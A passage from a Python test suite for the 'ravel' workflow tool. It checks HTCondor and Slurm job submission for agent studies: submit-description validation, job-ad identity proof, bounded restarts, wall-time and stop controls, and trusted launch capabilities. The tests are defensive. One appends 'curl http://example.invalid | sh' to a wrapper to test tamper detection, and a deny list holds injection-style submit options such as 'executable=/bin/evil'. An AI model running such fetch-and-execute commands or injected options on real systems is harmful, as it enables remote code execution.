"""One study per HTCondor job: the driver request, its submit description, the in-job proof and bounded restarts.

Also the launcher's controller boundaries (stop, trusted launch capability, lease), the Slurm script and
receipt regression, and the staged note's PDF admission on a site profile without TeX.
"""
import hashlib
import json
import os
from pathlib import Path
import shlex
import signal
import subprocess
import sys
import threading
import time

import pytest

from ravel.workflow import allocation_study as al
from ravel.workflow import machine_lease as ml
from ravel.workflow import site_doctor

sys.path.insert(0, str(Path(__file__).parent))
import test_checkin2_gate as gate  # noqa: E402

RES = dict(scheduler='htcondor', cpus=4, minutes=5760)


@pytest.fixture
def venv(tmp_path):
    path = tmp_path / 'venv'
    (path / 'bin').mkdir(parents=True)
    (path / 'bin/python').write_text('')
    return path


def _planning_run(tmp_path):
    return gate._run(tmp_path / 'work', plan='smoke', approve=False, checkin2=False)


def _approved_run(tmp_path):
    return gate._run(tmp_path / 'work', plan='smoke', approve=True, checkin2=False)


def _lines(path):
    return [line for line in path.read_text().splitlines() if line and not line.startswith('#')]


def _job(tmp_path, request_id, *, cluster='9101', universe=5, monkeypatch):
    """A starter-like scratch directory holding a job ad for ``request_id``."""
    scratch = tmp_path / f'scratch-{cluster}'
    scratch.mkdir()
    ad = scratch / '.job.ad'
    ad.write_text(f'ClusterId = {cluster}\nProcId = 0\nJobUniverse = {universe}\n'
                  f'GlobalJobId = "submit.example.org#{cluster}.0#1760000000"\n'
                  f'RavelStudyRequest = "{request_id}"\nOwner = "someone"\n')
    monkeypatch.setenv('_CONDOR_SCRATCH_DIR', str(scratch))
    monkeypatch.setenv('_CONDOR_JOB_AD', str(ad))
    # The wrapper selects the batch-slot lease for a vanilla job; a local job keeps the host's lease.
    if universe == 5:
        monkeypatch.setenv('RAVEL_LEASE_SCOPE', 'batch-slot')
    else:
        monkeypatch.delenv('RAVEL_LEASE_SCOPE', raising=False)
    monkeypatch.setattr(ml, 'allocation_identity', lambda: {'scope': 'htcondor', 'kind': 'batch-slot'})
    return f'htcondor-submit.example.org-{cluster}.0'


def test_a_vanilla_driver_request_writes_a_plain_submit_description_and_a_quoted_wrapper(tmp_path, venv):
    root = _planning_run(tmp_path)
    directory = al.prepare(root, ['claude', '-p', "read docs/workflow/start.md; don't approve"], venv=venv,
                           checkout=tmp_path, prefix='/data/u/ravel-tools', modules=['texlive/2024'],
                           env=['X509_USER_PROXY=/tmp/x509up_u1000'], claude_config_dir='/net/homes/u/.claude-ravel',
                           memory_mib=8192, submit_options=['+queue="long"', 'accounting_group=group_u.someone'],
                           max_attempts=3, **RES)
    request = json.loads((directory / 'request.json').read_text())
    assert request['resources'] | {} == {
        'scheduler': 'htcondor', 'universe': 'vanilla', 'cpus': 4, 'minutes': 5760, 'memory_mib': 8192,
        'runtime_attribute': '+MaxRuntime', 'use_x509userproxy': False, 'nodes': 1, 'job_name': 'ravel-study',
        'submit_options': {'+queue': '"long"', 'accounting_group': 'group_u.someone'}}
    assert request['restart'] == {'max_attempts': 3}
    assert request['rung'] == 'none' and request['binding'] is None
    assert not (directory / 'study.sbatch').exists()
    sub = _lines(directory / 'study.sub')
    assert sub[:3] == ['universe = vanilla', 'executable = /bin/bash', f"arguments = {directory / 'study.sh'}"]
    for line in (f'initialdir = {root.resolve()}', 'getenv = False', 'should_transfer_files = NO',
                 'request_cpus = 4', 'request_memory = 8192', '+MaxRuntime = 345600',
                 f'+RavelStudyRequest = "{request["request_id"]}"', 'batch_name = ravel-study',
                 '+queue = "long"', 'accounting_group = group_u.someone',
                 f'log = {directory / "condor.log"}'):
        assert line in sub, line
    assert sub[-1] == 'queue 1' and sum(line.startswith('queue') for line in sub) == 1
    wrapper = (directory / 'study.sh').read_text()
    assert 'module load texlive/2024' in wrapper and 'export RAVEL_NATIVE_BUILD=/data/u/ravel-tools' in wrapper
    assert 'export CLAUDE_CONFIG_DIR=/net/homes/u/.claude-ravel' in wrapper
    assert 'export X509_USER_PROXY=/tmp/x509up_u1000' in wrapper
    assert 'export RAVEL_LEASE_SCOPE=batch-slot' in wrapper and 'export RAVEL_JOBS=4' in wrapper
    assert 'SLURM' not in wrapper and 'SBATCH' not in wrapper
    assert wrapper.rstrip().endswith(f"-m ravel site study-job run --request {directory / 'request.json'}")
    # The job starts without the submitter's environment; the profile, modules and path helper read HOME.
    lines = wrapper.splitlines()
    home = lines.index(f"export HOME={shlex.quote(request['environment']['home'])}")
    assert home < min(i for i, line in enumerate(lines) if any(w in line for w in ('/etc/profile', 'module load',
                                                                                    'paths.sh')))


def test_a_local_universe_driver_asks_for_no_slot_and_keeps_the_hosts_lease(tmp_path, venv):
    directory = al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path, universe='local',
                           **RES)
    sub = _lines(directory / 'study.sub')
    assert sub[0] == 'universe = local'
    assert not [line for line in sub if line.startswith(('request_', '+MaxRuntime', 'should_transfer'))]
    wrapper = (directory / 'study.sh').read_text()
    assert 'RAVEL_LEASE_SCOPE' not in wrapper and 'export RAVEL_JOBS=4' in wrapper


def test_runtime_attribute_follows_the_site_or_is_left_out(tmp_path, venv):
    root = _planning_run(tmp_path)
    named = al.prepare(root, ['agent'], venv=venv, checkout=tmp_path, runtime_attribute='+RequestRuntime', **RES)
    assert '+RequestRuntime = 345600' in _lines(named / 'study.sub')
    plain = al.prepare(root, ['agent'], venv=venv, checkout=tmp_path, runtime_attribute='none', **RES)
    assert not [line for line in _lines(plain / 'study.sub') if 'Runtime' in line]


@pytest.mark.parametrize('option', [
    'executable=/bin/evil', 'universe=local', 'arguments=x', 'getenv=True', 'environment=A=1',
    'request_cpus=64', 'RequestMemory=1', '+RavelStudyRequest="other"', '+MaxRuntime=1', 'kill_sig=SIGKILL',
    'on_exit_remove=false', 'max_retries=9', 'periodic_remove=true', 'queue=5', 'initialdir=/tmp',
    'log=/tmp/x', '+queue="$(Cluster)"', '+queue="long', 'novalue', 'bad key=1', 'output=/tmp/o',
    # A trailing backslash would continue the value onto the next submit line.
    'requirements=(Arch == "X86_64") \\'])
def test_submit_options_cannot_replace_ravel_fields_or_use_submit_macros(tmp_path, venv, option):
    with pytest.raises(ValueError):
        al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path, submit_options=[option],
                   **RES)


@pytest.mark.parametrize('change', [dict(account='lab'), dict(partition='standard'), dict(universe='grid'),
                                    dict(memory_mib=0), dict(max_attempts=0), dict(max_attempts=11),
                                    dict(runtime_attribute='MaxRuntime'), dict(runtime_attribute='+RequestCpus'),
                                    dict(job_name='a b')])
def test_htcondor_requests_refuse_slurm_fields_and_unsafe_values(tmp_path, venv, change):
    with pytest.raises(ValueError):
        al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path, **(RES | change))


@pytest.mark.parametrize('change', [dict(universe='local'), dict(memory_mib=4096), dict(max_attempts=2),
                                    dict(submit_options=['+queue="long"']), dict(use_x509userproxy=True)])
def test_slurm_requests_refuse_htcondor_fields(tmp_path, venv, change):
    with pytest.raises(ValueError):
        al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path, account='lab',
                   partition='standard', cpus=1, minutes=10, **change)


def test_a_slurm_request_still_needs_its_account_and_partition(tmp_path, venv):
    with pytest.raises(ValueError, match='--account and --partition'):
        al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path, cpus=1, minutes=10)


def test_paths_that_a_submit_description_cannot_carry_literally_are_refused(tmp_path, venv):
    root = gate._run(tmp_path / 'with space', plan='smoke', approve=False, checkin2=False)
    with pytest.raises(ValueError, match='plain path'):
        al.prepare(root, ['agent'], venv=venv, checkout=tmp_path, **RES)


def test_the_sites_job_flavour_and_attributes_stay_open(tmp_path, venv):
    directory = al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path,
                           submit_options=['+JobFlavour="nextweek"', 'MY.Project="analysis"', 'requirements=(Arch == "X86_64")'],
                           **RES)
    sub = _lines(directory / 'study.sub')
    assert {'+JobFlavour = "nextweek"', 'MY.Project = "analysis"', 'requirements = (Arch == "X86_64")'} <= set(sub)


def test_the_proxy_is_handed_over_by_the_scheduler_when_asked(tmp_path, venv):
    directory = al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path,
                           use_x509userproxy=True, **RES)
    assert 'use_x509userproxy = true' in _lines(directory / 'study.sub')


def test_condor_submission_records_the_job_id(tmp_path, venv):
    directory = al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path, **RES)
    tool = tmp_path / 'condor_submit'
    tool.write_text('#!/bin/sh\necho "$@" > "$0.args"; echo "9102.0 - 9102.0"\n')
    tool.chmod(0o755)
    assert al.submit(directory, condor_submit=str(tool)) == '9102.0'
    assert (tmp_path / 'condor_submit.args').read_text().split() == ['-terse', str(directory / 'study.sub')]
    record = json.loads((directory / 'submission.json').read_text())
    assert record['job_id'] == '9102.0' and record['scheduler'] == 'htcondor'


def test_a_refused_or_unparsable_condor_submission_is_typed(tmp_path, venv):
    directory = al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path, **RES)
    refused = tmp_path / 'refused'
    refused.write_text('#!/bin/sh\necho "ERROR: no schedd" >&2; exit 1\n')
    refused.chmod(0o755)
    with pytest.raises(al.NotSubmitted, match='no schedd'):
        al.submit(directory, condor_submit=str(refused))
    garbled = tmp_path / 'garbled'
    garbled.write_text('#!/bin/sh\necho "Submitting job(s)."\n')
    garbled.chmod(0o755)
    with pytest.raises(ValueError) as caught:
        al.submit(directory, condor_submit=str(garbled))
    assert not isinstance(caught.value, al.NotSubmitted)
    assert not (directory / 'submission.json').exists()


def test_a_changed_approval_refuses_the_condor_submission(tmp_path, venv):
    root = _approved_run(tmp_path)
    directory = al.prepare(root, ['agent'], venv=venv, checkout=tmp_path, rung='smoke', **RES)
    approval = root / 'inputs/checkin1_approval.json'
    approval.write_text(approval.read_text().replace('Yes, run the plan', 'Yes, run the plan!'))
    tool = tmp_path / 'condor_submit'
    tool.write_text('#!/bin/sh\necho submitted >> "$0.calls"; echo "1.0 - 1.0"\n')
    tool.chmod(0o755)
    with pytest.raises(ValueError):
        al.submit(directory, condor_submit=str(tool))
    assert not (tmp_path / 'condor_submit.calls').exists()


def test_the_job_refuses_without_the_job_ad_of_its_request(tmp_path, venv, monkeypatch):
    directory = al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path, **RES)
    monkeypatch.delenv('_CONDOR_SCRATCH_DIR', raising=False)
    monkeypatch.delenv('_CONDOR_JOB_AD', raising=False)
    with pytest.raises(ValueError, match='not inside the HTCondor job of this request'):
        al.run(directory / 'request.json')
    _job(tmp_path, 'another-request', monkeypatch=monkeypatch)
    with pytest.raises(ValueError, match='not inside the HTCondor job of this request'):
        al.run(directory / 'request.json')


def test_a_job_ad_outside_the_scratch_directory_proves_nothing(tmp_path, venv, monkeypatch):
    directory = al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path, **RES)
    request = json.loads((directory / 'request.json').read_text())
    _job(tmp_path, request['request_id'], monkeypatch=monkeypatch)
    elsewhere = tmp_path / 'copied.ad'
    elsewhere.write_text(Path(os.environ['_CONDOR_JOB_AD']).read_text())
    monkeypatch.setenv('_CONDOR_JOB_AD', str(elsewhere))
    assert al.htcondor_job(request['request_id']) is None


def test_the_job_runs_the_agent_records_the_job_and_collects(tmp_path, venv, monkeypatch):
    root = _planning_run(tmp_path)
    agent = [sys.executable, '-c', 'import os,pathlib;pathlib.Path("agent-was-here").write_text('
             'os.environ["RAVEL_RUN_ID"]+" "+os.environ["RAVEL_ALLOCATION_ATTEMPT"]);print("stub agent")']
    collect = tmp_path / 'collected'
    directory = al.prepare(root, agent, venv=venv, checkout=tmp_path, collect_to=str(collect), **RES)
    request = json.loads((directory / 'request.json').read_text())
    key = _job(tmp_path, request['request_id'], monkeypatch=monkeypatch)
    assert al.run(directory / 'request.json') == 0
    assert (root / 'agent-was-here').read_text() == request['run']['run_id'] + ' 1'
    receipt = json.loads((root / 'logs/allocations' / key / 'allocation.json').read_text())
    assert receipt['state'] == 'finished' and receipt['agent_exit'] == 0 and receipt['scheduler'] == 'htcondor'
    assert receipt['job'] == {'schedd': 'submit.example.org', 'cluster': '9101', 'proc': '0',
                              'global_job_id': 'submit.example.org#9101.0#1760000000', 'universe': 'vanilla'}
    assert [a['state'] for a in receipt['attempts']] == ['finished'] and receipt['max_attempts'] == 1
    assert 'stub agent' in (root / 'logs/allocations' / key / 'agent.log').read_text()
    copy = collect / f"{root.name}-{request['run']['run_id']}"
    assert receipt['collected_to'] == str(copy) and (copy / 'agent-was-here').is_file()
    (directory / 'submission.json').write_text(json.dumps({'request_id': request['request_id'], 'job_id': '9101.0'}))
    assert al.collect(directory, scheduler=lambda job: 'missing')['status'] == 'completed'


def test_a_restarted_job_resumes_only_within_its_attempt_bound(tmp_path, venv, monkeypatch):
    root = _planning_run(tmp_path)
    agent = [sys.executable, '-c', 'import os;open("attempts","a").write(os.environ["RAVEL_ALLOCATION_ATTEMPT"]+"\\n")']
    directory = al.prepare(root, agent, venv=venv, checkout=tmp_path, max_attempts=2, **RES)
    request = json.loads((directory / 'request.json').read_text())
    key = _job(tmp_path, request['request_id'], monkeypatch=monkeypatch)
    path = root / 'logs/allocations' / key / 'allocation.json'
    path.parent.mkdir(parents=True)
    # An evicted first start: its process died before it could record an ending.
    path.write_text(json.dumps({'kind': 'allocation-study-receipt', 'request_id': request['request_id'],
                                'run': request['run'], 'state': 'running', 'attempts': [
                                    {'attempt': 1, 'started_utc': '2026-10-19T08:00:00Z', 'state': 'running'}]}))
    assert al.run(directory / 'request.json') == 0
    receipt = json.loads(path.read_text())
    assert [a['state'] for a in receipt['attempts']] == ['interrupted', 'finished']
    assert (root / 'attempts').read_text() == '2\n'
    receipt['state'] = 'running'
    receipt['attempts'][-1]['state'] = 'running'
    path.write_text(json.dumps(receipt))
    assert al.run(directory / 'request.json') == al.ATTEMPTS_EXHAUSTED
    receipt = json.loads(path.read_text())
    assert receipt['state'] == 'attempts-exhausted' and len(receipt['attempts']) == 2
    assert (root / 'attempts').read_text() == '2\n'


def test_a_restart_after_a_recorded_ending_never_runs_the_agent_again(tmp_path, venv, monkeypatch):
    root = _planning_run(tmp_path)
    agent = [sys.executable, '-c', 'open("ran","a").write("x")']
    directory = al.prepare(root, agent, venv=venv, checkout=tmp_path, max_attempts=3, **RES)
    request = json.loads((directory / 'request.json').read_text())
    _job(tmp_path, request['request_id'], monkeypatch=monkeypatch)
    assert al.run(directory / 'request.json') == 0
    assert al.run(directory / 'request.json') == 0
    assert (root / 'ran').read_text() == 'x'


def test_a_receipt_of_another_request_is_never_adopted(tmp_path, venv, monkeypatch):
    root = _planning_run(tmp_path)
    directory = al.prepare(root, ['agent'], venv=venv, checkout=tmp_path, **RES)
    request = json.loads((directory / 'request.json').read_text())
    key = _job(tmp_path, request['request_id'], monkeypatch=monkeypatch)
    path = root / 'logs/allocations' / key / 'allocation.json'
    path.parent.mkdir(parents=True)
    path.write_text(json.dumps({'kind': 'allocation-study-receipt', 'request_id': 'other', 'state': 'running',
                                'attempts': []}))
    with pytest.raises(ValueError, match='another request'):
        al.run(directory / 'request.json')


def test_the_wall_time_bound_stops_the_agent_group(tmp_path):
    child = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)'], start_new_session=True)
    started = time.monotonic()
    code, reached = al._wait_bounded(child, 0.3, grace_seconds=5)
    assert reached and code == -signal.SIGTERM and time.monotonic() - started < 5
    stubborn = subprocess.Popen([sys.executable, '-c', 'import signal,time; signal.signal(signal.SIGTERM, '
                                 'signal.SIG_IGN); print("ready", flush=True); time.sleep(60)'],
                                start_new_session=True, stdout=subprocess.PIPE)
    assert stubborn.stdout.readline().strip() == b'ready'
    code, reached = al._wait_bounded(stubborn, 0.1, grace_seconds=0.3)
    assert reached and code == -signal.SIGKILL
    quick = subprocess.Popen([sys.executable, '-c', 'pass'], start_new_session=True)
    assert al._wait_bounded(quick, 30, grace_seconds=1) == (0, False)


def test_the_job_records_the_wall_time_bound_as_its_ending(tmp_path, venv, monkeypatch):
    root = _planning_run(tmp_path)
    directory = al.prepare(root, [sys.executable, '-c', 'import time; time.sleep(60)'], venv=venv,
                           checkout=tmp_path, **(RES | dict(minutes=1)))
    request = json.loads((directory / 'request.json').read_text())
    key = _job(tmp_path, request['request_id'], monkeypatch=monkeypatch)
    monkeypatch.setattr(al, 'SECONDS_PER_MINUTE', 0.3)
    assert al.run(directory / 'request.json') == -signal.SIGTERM
    receipt = json.loads((root / 'logs/allocations' / key / 'allocation.json').read_text())
    assert receipt['state'] == 'deadline' and receipt['attempts'][-1]['deadline_reached'] is True
    (directory / 'submission.json').write_text(json.dumps({'request_id': request['request_id'], 'job_id': '9101.0'}))
    assert al.collect(directory, scheduler=lambda job: 'missing')['status'] == 'timed-out'


def test_a_forwarded_signal_marks_the_attempt_interrupted(tmp_path, venv, monkeypatch):
    root = _planning_run(tmp_path)
    agent = [sys.executable, '-c', 'import os,signal,time; time.sleep(0.5); os.kill(os.getppid(), signal.SIGTERM); '
             'time.sleep(60)']
    directory = al.prepare(root, agent, venv=venv, checkout=tmp_path, **RES)
    request = json.loads((directory / 'request.json').read_text())
    key = _job(tmp_path, request['request_id'], monkeypatch=monkeypatch)
    assert al.run(directory / 'request.json') == -signal.SIGTERM
    receipt = json.loads((root / 'logs/allocations' / key / 'allocation.json').read_text())
    assert receipt['state'] == 'interrupted' and receipt['attempts'][-1]['signal'] == 'SIGTERM'


@pytest.mark.parametrize('status,state', [('1', 'pending'), ('2', 'running'), ('3', 'cancelled'),
                                          ('4', 'completed'), ('5', 'held'), ('7', 'pending')])
def test_the_condor_queue_state_is_read_from_queue_then_history(tmp_path, monkeypatch, status, state):
    bins = tmp_path / 'bin'
    bins.mkdir()
    (bins / 'condor_q').write_text('#!/bin/sh\nexit 0\n')
    (bins / 'condor_history').write_text(f'#!/bin/sh\necho "$@" > "$0.args"; echo {status}\n')
    for tool in bins.iterdir():
        tool.chmod(0o755)
    monkeypatch.setenv('PATH', f'{bins}:{os.environ["PATH"]}')
    assert al._condor_state('9103.0') == state
    assert (bins / 'condor_history.args').read_text().split()[:3] == ['9103.0', '-limit', '1']


def test_a_held_driver_is_reported_without_a_receipt_ending(tmp_path, venv):
    directory = al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path, **RES)
    (directory / 'submission.json').write_text(json.dumps({'request_id': 'x', 'job_id': '9104.0'}))
    assert al.collect(directory, scheduler=lambda job: 'held')['status'] == 'held'


def test_the_site_command_writes_an_htcondor_request(tmp_path, venv, capsys):
    root = _planning_run(tmp_path)
    code = site_doctor.main(['study-job', 'submit', '--scheduler', 'htcondor', '--rundir', str(root),
                             '--cpus', '2', '--time', '600', '--memory', '4096', '--universe', 'vanilla',
                             '--submit-option', '+queue="long"', '--max-attempts', '2',
                             '--venv', str(venv), '--checkout', str(tmp_path), '--dry-run', '--', 'claude', '-p', 'hi'])
    assert code == 0
    out = json.loads(capsys.readouterr().out)
    assert 'job_id' not in out and out['script'].endswith('study.sub') and Path(out['wrapper']).is_file()
    request = json.loads(Path(out['request']).read_text())
    assert request['agent']['argv'] == ['claude', '-p', 'hi'] and request['restart'] == {'max_attempts': 2}
    assert site_doctor.main(['study-job', 'submit', '--rundir', str(root), '--cpus', '2', '--time', '10',
                             '--venv', str(venv), '--checkout', str(tmp_path), '--dry-run', '--', 'claude']) == 2


# ---- lease, wrapper and job-ad boundaries ---------------------------------------------------------

@pytest.mark.parametrize('pair', ['RAVEL_LEASE_SCOPE=batch-slot', 'RAVEL_STATE_DIR=/tmp/elsewhere',
                                  'RAVEL_MACHINE_LEASE=x', 'RAVEL_JOBS=64', 'RAVEL_ALLOCATION_ATTEMPT=1',
                                  'RAVEL_WMS_CAPABILITY=rwc1.a.b.cccccccccccccccccccccccccccccccc',
                                  '_CONDOR_SCRATCH_DIR=/tmp/s', 'SLURM_JOB_ID=1', 'HOME=/tmp', 'PATH=/tmp',
                                  'RAVEL_NATIVE_BUILD=/tmp/p', 'CLAUDE_CONFIG_DIR=/tmp/c'])
def test_a_request_cannot_set_the_variables_of_the_lease_or_the_agent(tmp_path, venv, pair):
    root = _planning_run(tmp_path)
    with pytest.raises(ValueError, match='set by RAVEL'):
        al.prepare(root, ['agent'], venv=venv, checkout=tmp_path, env=[pair], **RES)
    assert not (root / al.REQUESTS).exists()


def test_an_ordinary_variable_still_reaches_the_job(tmp_path, venv):
    directory = al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path,
                           env=['RAVEL_LEASE_WAIT_SECONDS=60', 'X509_USER_PROXY=/tmp/x509up_u1000'], **RES)
    assert 'export RAVEL_LEASE_WAIT_SECONDS=60' in (directory / 'study.sh').read_text()


@pytest.mark.parametrize('universe,ad_universe,lease', [('local', 12, 'batch-slot'), ('vanilla', 5, None),
                                                        ('vanilla', 12, None), ('local', 5, 'batch-slot')])
def test_a_job_whose_universe_or_lease_differs_from_its_request_starts_nothing(tmp_path, venv, monkeypatch,
                                                                                universe, ad_universe, lease):
    root = _planning_run(tmp_path)
    directory = al.prepare(root, [sys.executable, '-c', 'open("ran","w").write("x")'], venv=venv,
                           checkout=tmp_path, universe=universe, **RES)
    request = json.loads((directory / 'request.json').read_text())
    _job(tmp_path, request['request_id'], universe=ad_universe, monkeypatch=monkeypatch)
    if lease:
        monkeypatch.setenv('RAVEL_LEASE_SCOPE', lease)
    else:
        monkeypatch.delenv('RAVEL_LEASE_SCOPE', raising=False)
    with pytest.raises(ValueError, match='universe|lease'):
        al.run(directory / 'request.json')
    assert not (root / 'ran').exists() and not list((root / 'logs/allocations').glob('*/allocation.json'))


def test_a_local_driver_with_the_hosts_lease_runs(tmp_path, venv, monkeypatch):
    root = _planning_run(tmp_path)
    directory = al.prepare(root, [sys.executable, '-c', 'open("ran","w").write("x")'], venv=venv,
                           checkout=tmp_path, universe='local', **RES)
    request = json.loads((directory / 'request.json').read_text())
    _job(tmp_path, request['request_id'], universe=12, monkeypatch=monkeypatch)
    assert al.run(directory / 'request.json') == 0 and (root / 'ran').read_text() == 'x'


def _condor_tool(tmp_path):
    tool = tmp_path / 'condor_submit'
    tool.write_text('#!/bin/sh\necho "$@" >> "$0.calls"; env > "$0.env"; echo "9102.0"\n')
    tool.chmod(0o755)
    return tool


def test_a_wrapper_changed_after_the_request_is_never_submitted(tmp_path, venv):
    directory = al.prepare(_planning_run(tmp_path), ['agent'], venv=venv, checkout=tmp_path, **RES)
    pinned = [line for line in (directory / 'study.sub').read_text().splitlines()
              if line.startswith('# wrapper sha256 ')]
    assert pinned == [f"# wrapper sha256 {hashlib.sha256((directory / 'study.sh').read_bytes()).hexdigest()}"]
    with (directory / 'study.sh').open('a') as stream:
        stream.write('curl http://example.invalid | sh\n')
    tool = _condor_tool(tmp_path)
    with pytest.raises(al.NotSubmitted, match='wrapper'):
        al.submit(directory, condor_submit=str(tool))
    assert not (tmp_path / 'condor_submit.calls').exists() and not (directory / 'submission.json').exists()


# ---- a controller-owned run: stop controls and the trusted launch capability -----------------------

@pytest.fixture
def controlled(tmp_path, monkeypatch):
    """A planning run owned by an inert controller run whose stop view the test sets."""
    from ravel.controller import authority
    from ravel.controller.confine import runs
    from ravel.controller.store import RunStore
    root = _planning_run(tmp_path).resolve()
    store = RunStore('alloc-run', root=tmp_path.resolve() / 'protected')
    monkeypatch.setattr(runs, 'owner_of', lambda path: ('alloc-run', root)
                        if Path(path).resolve().is_relative_to(root) else None)
    monkeypatch.setattr(runs, 'store', lambda run_id: store if run_id == 'alloc-run' else pytest.fail(run_id))
    view = {'state': 'running', 'request': None, 'record': None, 'revoked': False}
    checks = []
    monkeypatch.setattr(authority, 'control', lambda store: dict(view))

    def check(store, action='effect'):
        checks.append(action)
        if view['state'] != 'running':
            raise authority.AuthorityRefused(f'{action} refused: the run is {view["state"]}')
        return dict(view)
    monkeypatch.setattr(authority, 'check', check)
    return root, store, view, checks


def _capability(store, directory, launch_id='launch-one'):
    from ravel.controller.confine import capability
    script = (directory / 'study.sub').absolute()
    sha = hashlib.sha256(script.read_bytes()).hexdigest()
    token = capability.mint_capability(store, launch_id, {'workflow_dir': str(directory), 'max_jobs': 1,
                                                          'jobscript_sha256': sha})
    return token, {'jobscript': {'path': str(script), 'sha256': sha}}


def test_a_controller_run_submits_only_through_its_trusted_launch_capability(controlled, tmp_path, venv,
                                                                              monkeypatch):
    from ravel.controller.routes.study import site
    from ravel.workflow import wms_policy
    root, store, view, _ = controlled
    directory = al.prepare(root, ['agent'], venv=venv, checkout=tmp_path, **RES)
    tool = _condor_tool(tmp_path)
    with pytest.raises(al.NotSubmitted, match='trusted launch capability'):
        al.submit(directory, condor_submit=str(tool))
    token, scope = _capability(store, directory)
    other = al.prepare(root, ['agent', 'other'], venv=venv, checkout=tmp_path, **RES)
    with site.trusted_launch(store, 'launch-one', token, scope):
        # The capability pins another request's description: nothing is submitted.
        with pytest.raises(al.NotSubmitted):
            al.submit(other, condor_submit=str(tool))
    assert not (tmp_path / 'condor_submit.calls').exists() and store.scan('wms-submission') == []
    monkeypatch.setenv(wms_policy.CAPABILITY_ENV, token)
    with site.trusted_launch(store, 'launch-one', token, scope):
        assert al.submit(directory, condor_submit=str(tool)) == '9102.0'
        with pytest.raises(al.NotSubmitted, match='all were submitted'):
            al.submit(directory, condor_submit=str(tool))
    calls = (tmp_path / 'condor_submit.calls').read_text().splitlines()
    assert len(calls) == 1 and len(store.scan('wms-submission')) == 1
    # The scheduler received the frozen admitted copy, never the live file, and never the capability.
    snapshot = Path(calls[0].split()[1])
    assert snapshot != directory / 'study.sub' and snapshot.read_bytes() == (directory / 'study.sub').read_bytes()
    assert wms_policy.CAPABILITY_ENV not in (tmp_path / 'condor_submit.env').read_text()
    record = json.loads((directory / 'submission.json').read_text())
    assert record['job_id'] == '9102.0' and record['admission']['controller_run'] == 'alloc-run'
    assert record['admission']['jobscript_sha256'] == hashlib.sha256(snapshot.read_bytes()).hexdigest()


def test_a_stopped_controller_run_writes_submits_and_starts_nothing(controlled, tmp_path, venv, monkeypatch):
    from ravel.controller.routes.study import site
    root, store, view, checks = controlled
    view['state'] = 'stop_requested'
    with pytest.raises(ValueError, match='stop_requested'):
        al.prepare(root, ['agent'], venv=venv, checkout=tmp_path, **RES)
    assert not (root / al.REQUESTS).exists()
    view['state'] = 'running'
    directory = al.prepare(root, [sys.executable, '-c', 'open("ran","w").write("x")'], venv=venv,
                           checkout=tmp_path, max_attempts=3, **RES)
    token, scope = _capability(store, directory)
    tool = _condor_tool(tmp_path)
    view['state'] = 'pause_requested'
    with site.trusted_launch(store, 'launch-one', token, scope):
        with pytest.raises(al.NotSubmitted, match='pause_requested'):
            al.submit(directory, condor_submit=str(tool))
    # The refusal comes before the capability is used: it stays available for a resumed run.
    assert not (tmp_path / 'condor_submit.calls').exists() and store.scan('wms-submission') == []
    request = json.loads((directory / 'request.json').read_text())
    key = _job(tmp_path, request['request_id'], monkeypatch=monkeypatch)
    view['state'] = 'stop_requested'
    assert al.run(directory / 'request.json') == al.STOPPED
    receipt = json.loads((root / 'logs/allocations' / key / 'allocation.json').read_text())
    assert receipt['state'] == 'stopped' and receipt['agent_exit'] is None
    assert receipt['controller_run'] == 'alloc-run' and [a['state'] for a in receipt['attempts']] == ['stopped']
    view['state'] = 'running'
    # A recorded ending is never run again, even after the run resumes.
    assert al.run(directory / 'request.json') == al.STOPPED and not (root / 'ran').exists()
    (directory / 'submission.json').write_text(json.dumps({'request_id': request['request_id'], 'job_id': '9101.0'}))
    assert al.collect(directory, scheduler=lambda job: 'missing')['status'] == 'cancelled'
    assert 'an allocation study start' in checks


def test_a_stop_while_the_agent_runs_drains_then_stops_its_group(monkeypatch):
    from ravel.controller import authority
    view = {'state': 'running', 'revoked': False}
    monkeypatch.setattr(authority, 'control', lambda store: dict(view))
    owner = ('alloc-run', object())
    child = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)'], start_new_session=True)
    threading.Timer(0.3, lambda: view.update(state='stop_requested')).start()
    started = time.monotonic()
    code, ending, seen = al._wait_controlled(child, None, owner, grace_seconds=2, poll_seconds=0.05,
                                             drain_seconds=0.5)
    assert (code, ending, seen['state']) == (-signal.SIGTERM, 'stopped', 'stop_requested')
    assert 0.7 < time.monotonic() - started < 6
    # A resume inside the drain period cancels it; an agent that ends by itself ends 'finished'.
    view['state'] = 'running'
    child = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(1.2)'], start_new_session=True)
    threading.Timer(0.2, lambda: view.update(state='stop_requested')).start()
    threading.Timer(0.4, lambda: view.update(state='running')).start()
    code, ending, _ = al._wait_controlled(child, None, owner, grace_seconds=2, poll_seconds=0.05, drain_seconds=0.6)
    assert (code, ending) == (0, 'finished')
    # An unreadable control view counts as not running.
    monkeypatch.setattr(authority, 'control', lambda store: (_ for _ in ()).throw(OSError('store gone')))
    child = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)'], start_new_session=True)
    code, ending, seen = al._wait_controlled(child, None, owner, grace_seconds=2, poll_seconds=0.05,
                                             drain_seconds=0.2)
    assert ending == 'stopped' and seen['state'] == 'unreadable'
    # The wall time still bounds a controller run's agent.
    monkeypatch.setattr(authority, 'control', lambda store: {'state': 'running', 'revoked': False})
    child = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)'], start_new_session=True)
    assert al._wait_controlled(child, 0.3, owner, grace_seconds=2, poll_seconds=0.05)[1] == 'deadline'


def test_the_job_of_a_controller_run_records_a_stop_while_its_agent_runs(controlled, tmp_path, venv, monkeypatch):
    root, store, view, _ = controlled
